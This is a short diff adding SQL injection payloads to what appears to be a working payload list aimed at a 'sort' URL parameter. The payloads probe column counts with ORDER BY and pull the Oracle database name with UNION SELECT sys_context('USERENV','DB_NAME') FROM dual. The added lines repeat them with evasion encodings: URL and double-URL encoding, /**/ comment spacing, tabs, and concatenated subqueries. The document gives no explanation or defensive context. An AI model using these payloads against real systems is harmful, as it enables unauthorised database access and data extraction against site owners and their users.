@@ -6,3 +6,13 @@ sort=createdByTime' ORDER BY 2--
 sort=createdByTime' ORDER BY 3--
 
 sort=createdByTime' UNION SELECT sys_context('USERENV', 'DB_NAME') FROM dual--
+
+
+sort=createdByTime'%20ORDER%20BY%201--
+sort=createdByTime'%20UNION%20SELECT%20sys_context('USERENV','DB_NAME')%20FROM%20dual--
+sort=createdByTime'/**/ORDER/**/BY/**/1--
+sort=createdByTime'/**/UNION/**/SELECT/**/sys_context('USERENV','DB_NAME')/**/FROM/**/dual--
+sort=createdByTime'%09ORDER%09BY%091--
+sort=createdByTime'||(SELECT/**/sys_context('USERENV','DB_NAME')/**/FROM/**/dual)||
+sort=createdByTime'%2520ORDER%2520BY%25201--
+
